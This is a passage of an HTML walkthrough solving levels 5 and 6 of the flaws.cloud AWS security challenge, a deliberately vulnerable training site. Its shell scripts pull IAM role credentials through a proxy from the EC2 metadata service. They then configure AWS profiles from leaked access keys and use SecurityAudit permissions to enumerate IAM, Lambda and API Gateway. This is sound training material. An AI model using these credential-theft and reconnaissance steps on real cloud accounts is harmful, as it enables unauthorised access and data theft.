+<span class="nv">ROLE</span><span class="o">=</span><span class="k">$(</span>curl --silent http://<span class="nv">$PROXY</span>/169.254.169.254/latest/meta-data/iam/security-credentials/ <span class="se">\</span>
+  head -n1 <span class="se">\</span>
+<span class="k">)</span>
+curl --silent http://<span class="nv">$PROXY</span>/169.254.169.254/latest/meta-data/iam/security-credentials/<span class="nv">$ROLE</span> <span class="se">\</span>
+  <span class="p">|</span> tee <span class="nv">$LEVEL5</span>-creds.json
+
+<span class="hll"><span class="c1"># Create a profile</span>
+</span><span class="nv">AK</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.AccessKeyId&#39;</span> <span class="nv">$LEVEL5</span>-creds.json<span class="k">)</span>
+<span class="nv">SAK</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.SecretAccessKey&#39;</span> <span class="nv">$LEVEL5</span>-creds.json<span class="k">)</span>
+<span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.Token&#39;</span> <span class="nv">$LEVEL5</span>-creds.json<span class="k">)</span>
+cat <span class="s">&lt;&lt;EOF | aws configure --profile $LEVEL5</span>
+<span class="s">$AK</span>
+<span class="s">$SAK</span>
+<span class="s">$REGION</span>
+<span class="s">json</span>
+<span class="s">EOF</span>
+aws --profile <span class="nv">$LEVEL5</span> configure <span class="nb">set</span> aws_session_token <span class="s2">&quot;</span><span class="nv">$TOKEN</span><span class="s2">&quot;</span>
+
+<span class="hll"><span class="c1"># Test out the profile against the level 6 bucket</span>
+</span><span class="hll">aws --profile <span class="nv">$LEVEL5</span> s3 ls --recursive s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+</span><span class="hll"><span class="c1"># Output includes: ddcc78ff/</span>
+</span>
+<span class="hll"><span class="c1"># Visit the ddcc78ff directory</span>
+</span><span class="hll">curl http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
+</span><span class="hll"><span class="c1"># Output includes: you&#39;re getting a user access key that has the SecurityAudit policy attached to it.</span>
+</span><span class="hll"><span class="c1"># Output includes: Access key ID: AKIAJFQ6E7BY57Q3OBGA</span>
+</span><span class="hll"><span class="c1"># Output includes: Secret: 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</span>
+</span></pre></div>
+</div>
+<p>We’ll delay reconnaissance of the newly exposed credentials to the next level. Note they are token-based (created by AWS STS) and are therefore time-limited.</p>
+</div>
+</div>
+<div class="section" id="id27">
+<h2>3.2.7. <a class="reference external" href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/">flaws.cloud Level 6</a><a class="headerlink" href="#id27" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="level-6-aws-background">
+<h3>3.2.7.1. Level 6 AWS background<a class="headerlink" href="#level-6-aws-background" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="securityaudit-policy">
+<h4>3.2.7.1.1. SecurityAudit policy<a class="headerlink" href="#securityaudit-policy" title="Permalink to this headline">¶</a></h4>
+<p>From <a class="reference external" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html">AWS IAM - AWS Managed Policies for Job Functions</a> the <a class="reference external" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html#jf_security-auditor">AWS IAM - Security Auditor</a> “grants permissions to view configuration data for many AWS services and to review their logs” - perfect for reconnaisance. The permissions associated with SecurityAudit are not documented but are available at <a class="reference external" href="https://gist.github.com/gene1wood/55b358748be3c314f956#file-all_aws_managed_policies-json-L5664">gene1wood/all_aws_managed_policies.json - SecurityAudit</a>.</p>
+</div>
+<div class="section" id="api-gateway-and-lambda-functions">
+<h4>3.2.7.1.2. API Gateway and Lambda functions<a class="headerlink" href="#api-gateway-and-lambda-functions" title="Permalink to this headline">¶</a></h4>
+<p>This exploit will require basic understanding of Lambda functions and more importantly the API Gateway. For a high level overview see:</p>
+<ul class="simple">
+<li><a class="reference external" href="https://aws.amazon.com/serverless/build-a-web-app/">AWS BUILD YOUR FIRST Serverless Web Application</a> - focus on the diagram showing the Amazon API Gateway and AWS Lambda.</li>
+<li><a class="reference external" href="https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html">AWS API GW - What Is Amazon API Gateway?</a> - again, focus on the diagram showing the API Gateway architecture.</li>
+<li><a class="reference external" href="https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-basic-concept.html">AWS API GW - Amazon API Gateway Concepts</a> - understand the terms API Gateway, API deployment (introduces API stages), API endpoints, API stage, Method request/response vs Integration request/response + Mapping template (converting method request to integration request, or integration response to method response).</li>
+<li>From <a class="reference external" href="https://docs.aws.amazon.com/apigateway/api-reference/">AWS API GW - Amazon API Gateway REST API</a>, <a class="reference external" href="https://docs.aws.amazon.com/apigateway/api-reference/making-http-requests/">AWS API GW - Making HTTP Requests to Amazon API Gateway</a> is essential and the concepts behind <a class="reference external" href="https://docs.aws.amazon.com/apigateway/api-reference/signing-requests/">AWS API GW - Signing Requests</a> are useful in other contexts.</li>
+<li><a class="reference external" href="https://docs.aws.amazon.com/lambda/latest/dg/with-on-demand-https.html">AWS Lambda - Using AWS Lambda with Amazon API Gateway (On-Demand Over HTTPS)</a> leads to <a class="reference external" href="https://docs.aws.amazon.com/lambda/latest/dg/with-on-demand-https-example.html">AWS Lambda - Using AWS Lambda with Amazon API Gateway (On-Demand Over HTTPS) Example</a> which has the very important <a class="reference external" href="https://docs.aws.amazon.com/lambda/latest/dg/with-on-demand-https-example-configure-event-source.html">AWS Lambda - Step 3: Create an API Using Amazon API Gateway and Test It</a> which details how the API Gateway is constructed. This is required knowledge for the flaws.cloud exploit.</li>
+<li>Non-AWS API Gateway examples are <a class="reference external" href="https://www.alexedwards.net/blog/serverless-api-with-go-and-aws-lambda">How to build a Serverless API with Go and AWS Lambda</a> (you can ignore the golang parts) and <a class="reference external" href="https://blog.couchbase.com/microservice-aws-api-gateway-lambda-couchbase/">Microservice using AWS API Gateway, AWS Lambda and Couchbase</a> (you can ignore the Couchbase functions).</li>
+</ul>
+<p>To clarify method response vs integration response see <a class="reference external" href="https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-create-api.html">AWS API GW - Creating an API in Amazon API Gateway</a>:</p>
+<blockquote>
+<div>Expressed in the request parameters and body, a Method defines the application programming interface for the client to access the exposed Resource and represents an incoming request submitted by the client. You then create an <a class="reference external" href="https://docs.aws.amazon.com/apigateway/api-reference/resource/integration/">Integration</a> resource to integrate the Method with a backend endpoint, also known as the integration endpoint, by forwarding the incoming request to a specified integration endpoint URI. If necessary, you transform request parameters or body to meet the backend requirements. For responses, you can create a <a class="reference external" href="https://docs.aws.amazon.com/apigateway/api-reference/resource/method-response/">MethodResponse</a> resource to represent a request response received by the client and you create an <a class="reference external" href="https://docs.aws.amazon.com/apigateway/api-reference/resource/integration-response/">IntegrationResponse</a> resource to represent the request response that is returned by the backend. You can configure the integration response to transform the backend response data before returning the data to the client or to pass the backend response as-is to the client.</div></blockquote>
+</div>
+</div>
+<div class="section" id="exploit-securityaudit-policy">
+<h3>3.2.7.2. Exploit SecurityAudit policy<a class="headerlink" href="#exploit-securityaudit-policy" title="Permalink to this headline">¶</a></h3>
+<p>Level 6 provides <em>Access key ID: AKIAJFQ6E7BY57Q3OBGA</em> and <em>Secret: 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</em> with the SecurityAudit policy.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">LEVEL6</span><span class="o">=</span>level6
+<span class="nv">DNS</span><span class="o">=</span><span class="s1">&#39;@8.8.8.8&#39;</span>
+<span class="nv">D</span><span class="o">=</span>level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+<span class="nv">REGION</span><span class="o">=</span><span class="k">$(</span>dig <span class="nv">$DNS</span> +short -x <span class="k">$(</span>dig <span class="nv">$DNS</span> +short <span class="nv">$D</span><span class="k">)</span> <span class="se">\</span>
+  <span class="p">|</span> sed <span class="s1">&#39;s/^.*website.//;s/.amazonaws.com\.$//&#39;</span><span class="k">)</span>
+<span class="nv">URL</span><span class="o">=</span><span class="nv">$D</span>/ddcc78ff
+
+<span class="hll"><span class="c1"># Create level6 profile</span>
+</span><span class="nv">AK</span><span class="o">=</span><span class="k">$(</span>curl --silent http://<span class="nv">$URL</span>/ <span class="p">|</span> grep <span class="s1">&#39;Access key ID:&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/^.*Access key ID: //;s/&lt;.*$//&#39;</span><span class="k">)</span>
+<span class="nv">SAK</span><span class="o">=</span><span class="k">$(</span>curl --silent http://<span class="nv">$URL</span>/ <span class="p">|</span> grep <span class="s1">&#39;Secret:&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/^.*Secret: //;s/&lt;.*$//&#39;</span><span class="k">)</span>
+cat <span class="s">&lt;&lt;EOF | aws configure --profile $LEVEL6</span>
+<span class="s">$AK</span>
+<span class="s">$SAK</span>
+<span class="s">$REGION</span>
+<span class="s">json</span>
+<span class="s">EOF</span>
+
+<span class="hll"><span class="c1"># Scout2 for reconnaissance</span>
+</span><span class="hll">Scout2 --profile <span class="nv">$LEVEL6</span> --region <span class="nv">$REGION</span> --report-dir scout2-<span class="nv">$LEVEL6</span>
+</span><span class="hll"><span class="o">(</span><span class="nb">cd</span> scout2-<span class="nv">$LEVEL6</span><span class="p">;</span> python3 -m http.server <span class="m">8080</span><span class="o">)</span>
+</span><span class="hll"><span class="c1"># Browse report ...</span>
+</span>
+<span class="hll"><span class="c1"># For detailed information:</span>
+</span>tail scout2-<span class="nv">$LEVEL6</span>/inc-awsconfig/aws_config-<span class="nv">$LEVEL6</span>.js -n +2 <span class="se">\</span>
+  <span class="p">|</span> jq <span class="s1">&#39;.&#39;</span> <span class="se">\</span>
+  <span class="p">|</span> tee <span class="nv">$LEVEL6</span>-scout2.json
+<span class="c1"># From this list of services:</span>
+<span class="c1">#   cloudformation cloudtrail cloudwatch directconnect</span>
+<span class="c1">#   ec2 efs elasticache elb elbv2 emr iam awslambda</span>
+<span class="c1">#   redshift rds route53 route53domains s3 ses sns sqs vpc</span>
+<span class="hll"><span class="c1"># Numerous services show interesting results:</span>
+</span><span class="k">for</span> SERVICE in awslambda cloudtrail ec2 elbv2 rds vpc<span class="p">;</span> <span class="k">do</span>
+  jq <span class="s1">&#39;.services.&#39;</span><span class="nv">$SERVICE</span><span class="s1">&#39;.regions[&quot;&#39;</span><span class="nv">$REGION</span><span class="s1">&#39;&quot;]&#39;</span> <span class="nv">$LEVEL6</span>-scout2.json <span class="p">|</span> tee <span class="nv">$LEVEL6</span>-service-<span class="nv">$SERVICE</span>.json
+<span class="k">done</span>
+<span class="hll"><span class="c1"># IAM is not region-based</span>
+</span>jq <span class="s1">&#39;.services.iam.credential_report&#39;</span> <span class="nv">$LEVEL6</span>-scout2.json
+jq <span class="s1">&#39;.services.iam.permissions&#39;</span> <span class="nv">$LEVEL6</span>-scout2.json
+jq <span class="s1">&#39;.services.iam.policies&#39;</span> <span class="nv">$LEVEL6</span>-scout2.json
+jq <span class="s1">&#39;.services.iam.roles&#39;</span> <span class="nv">$LEVEL6</span>-scout2.json
+jq <span class="s1">&#39;.services.iam.users&#39;</span> <span class="nv">$LEVEL6</span>-scout2.json
+
+<span class="hll"><span class="c1"># Investigate Level6 user</span>
+</span>aws --profile <span class="nv">$LEVEL6</span> iam get-user
+aws --profile <span class="nv">$LEVEL6</span> iam list-attached-user-policies --user-name <span class="nv">$LEVEL6</span> <span class="p">|</span> tee <span class="nv">$LEVEL6</span>-user-policies.json
+
+<span class="hll"><span class="c1"># Level6 has list_apigateways policy attached</span>
+</span><span class="nv">POLICYARN</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.AttachedPolicies[0].PolicyArn&#39;</span> <span class="nv">$LEVEL6</span>-user-policies.json<span class="k">)</span>
+aws --profile <span class="nv">$LEVEL6</span> iam get-policy --policy-arn <span class="nv">$POLICYARN</span> <span class="p">|</span> tee <span class="nv">$LEVEL6</span>-policy-version.json
+<span class="nv">POLICYVER</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.Policy.DefaultVersionId&#39;</span> <span class="nv">$LEVEL6</span>-policy-version.json<span class="k">)</span>
+aws --profile <span class="nv">$LEVEL6</span> iam get-policy-version --policy-arn <span class="nv">$POLICYARN</span> --version-id <span class="nv">$POLICYVER</span> <span class="se">\</span>
+  <span class="p">|</span> tee <span class="nv">$LEVEL6</span>-policy.json
+<span class="hll"><span class="c1"># This allows &quot;apigateway:GET&quot; on &quot;arn:aws:apigateway:us-west-2::/restapis/*&quot;</span>
+</span>
+<span class="hll"><span class="c1"># See if there are any lambda functions (available via apigateway)</span>
+</span>aws --profile <span class="nv">$LEVEL6</span> --region <span class="nv">$REGION</span> lambda list-functions <span class="p">|</span> tee <span class="nv">$LEVEL6</span>-lambda-functions.json
+<span class="c1"># Function Level6 available</span>
+<span class="hll"><span class="nv">FUNCTION</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.Functions[0].FunctionName&#39;</span> <span class="nv">$LEVEL6</span>-lambda-functions.json<span class="k">)</span>
+</span>aws --profile <span class="nv">$LEVEL6</span> --region <span class="nv">$REGION</span> lambda get-policy --function-name <span class="nv">$FUNCTION</span> <span class="se">\</span>
+  <span class="p">|</span> sed <span class="s1">&#39;s/&quot;{/{/g;s/}&quot;/}/g;s/\\&quot;/&quot;/g&#39;</span> <span class="p">|</span> jq <span class="s1">&#39;.&#39;</span> <span class="p">|</span> tee <span class="nv">$LEVEL6</span>-lambda-policy.json
+<span class="hll"><span class="c1"># The function is available at &quot;arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6&quot;</span>
+</span>
+<span class="hll"><span class="c1"># The lambda function is callable via:</span>
+</span><span class="hll"><span class="c1">#   https://s33ppypa75.execute-api.us-west-2.amazonaws.com/LAMBDA_STAGE/level6</span>
+</span><span class="hll"><span class="c1"># We&#39;re missing the LAMBDA_STAGE</span>
+</span><span class="nv">SOURCEARN</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.Policy.Statement[].Condition.ArnLike.&quot;AWS:SourceArn&quot;&#39;</span> <span class="nv">$LEVEL6</span>-lambda-policy.json<span class="k">)</span>
+<span class="nv">RESTAPI</span><span class="o">=</span><span class="si">${</span><span class="nv">SOURCEARN</span><span class="p">##*:</span><span class="si">}</span><span class="p">;</span> <span class="nv">RESTAPI</span><span class="o">=</span><span class="si">${</span><span class="nv">RESTAPI</span><span class="p">%%/*</span><span class="si">}</span>
+<span class="nv">LAMBDA_REGION</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$SOURCEARN</span> <span class="p">|</span> cut -d: -f4<span class="k">)</span>
+aws --profile <span class="nv">$LEVEL6</span> --region <span class="nv">$REGION</span> apigateway get-stages --rest-api-id <span class="s2">&quot;</span><span class="nv">$RESTAPI</span><span class="s2">&quot;</span> <span class="se">\</span>
+  <span class="p">|</span> tee <span class="nv">$LEVEL6</span>-apigw-stages.json
+<span class="nv">LAMBDA_STAGE</span><span class="o">=</span><span class="k">$(</span>jq -r <span class="s1">&#39;.item[0].stageName&#39;</span> <span class="nv">$LEVEL6</span>-apigw-stages.json<span class="k">)</span>
+
+<span class="hll"><span class="c1"># Fire off the lambda function</span>
+</span><span class="hll">curl --insecure https://<span class="nv">$RESTAPI</span>.execute-api.<span class="nv">$LAMBDA_REGION</span>.amazonaws.com/<span class="nv">$LAMBDA_STAGE</span>/<span class="si">${</span><span class="nv">FUNCTION</span><span class="p">,,</span><span class="si">}</span>
+</span><span class="hll"><span class="c1"># Output: &quot;Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/&quot;</span>
+</span></pre></div>
+</div>
+<p>And visiting <a class="reference external" href="http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/">http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/</a> concludes the exploit part.</p>
+</div>
+</div>
+<div class="section" id="cleaning-up">
+<h2>3.2.8. Cleaning Up<a class="headerlink" href="#cleaning-up" title="Permalink to this headline">¶</a></h2>
+<p>Follow the instructions above to <a class="reference internal" href="#flaws-delete-instance"><span class="std std-ref">delete the EC2 instance</span></a>, followed by <a class="reference internal" href="#flaws-delete-user"><span class="std std-ref">delete the $HACKER user &amp; SSH keys</span></a>, then manually clean up the added profiles in <code class="file docutils literal notranslate"><span class="pre">~/.aws/config</span></code> and <code class="file docutils literal notranslate"><span class="pre">~/.aws/credentials</span></code>.</p>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="moinmoin.html" class="btn btn-neutral float-right" title="3.3. MoinMoin" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="VWADP.html" class="btn btn-neutral" title="3.1. Finding and running challenges" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.3',
+            LANGUAGE:'None',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  <script type="text/javascript" src="../_static/js/theme.js"></script>
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
